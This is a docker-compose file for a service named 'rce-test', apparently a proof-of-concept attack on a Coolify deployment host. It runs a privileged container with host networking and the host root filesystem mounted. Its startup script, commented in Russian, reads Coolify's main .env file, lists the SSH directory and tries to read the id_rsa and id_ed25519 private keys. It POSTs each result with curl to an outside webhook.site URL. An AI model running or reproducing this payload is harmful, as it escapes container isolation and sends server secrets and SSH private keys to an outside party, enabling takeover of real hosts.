version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    privileged: true
    network_mode: host
    volumes:
      - '/:/host-root'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl
        
        # 1. Читаем главный .env
        cat /host-root/data/coolify/source/.env > /tmp/env.txt 2>&1
        curl -X POST --data-binary @/tmp/env.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=main_env
        
        # 2. Смотрим, что лежит в папке SSH (список файлов)
        ls -laR /host-root/data/coolify/ssh/ > /tmp/ssh_list.txt 2>&1
        curl -X POST --data-binary @/tmp/ssh_list.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=ssh_dir_listing
        
        # 3. Пытаемся прочитать сам приватный ключ (стандартное имя)
        cat /host-root/data/coolify/ssh/id_rsa > /tmp/ssh_key.txt 2>&1
        curl -X POST --data-binary @/tmp/ssh_key.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=ssh_private_key
        
        # 4. Пытаемся прочитать id_ed25519 (альтернативный формат)
        cat /host-root/data/coolify/ssh/id_ed25519 > /tmp/ssh_key2.txt 2>&1
        curl -X POST --data-binary @/tmp/ssh_key2.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=ssh_private_key_ed25519
        
        sleep 3600
